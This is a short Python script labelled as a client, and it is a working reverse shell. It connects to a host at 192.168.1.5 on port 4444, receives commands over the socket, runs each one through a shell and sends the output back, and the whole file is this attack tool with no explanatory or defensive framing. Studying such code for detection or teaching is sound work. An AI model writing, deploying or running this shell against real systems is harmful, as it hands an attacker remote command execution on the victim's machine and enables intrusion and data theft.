#client
import socket
import subprocess

IP = '192.168.1.5'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((IP, PORT))
while True:
     command=s.recv(1024)
     if command == b'exit' or command == b'':
          print('[+] Close')
          s.close()
          break
     else:
          proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          output= proc.stdout.read()+proc.stderr.read()
          print(output)
          s.send(output)
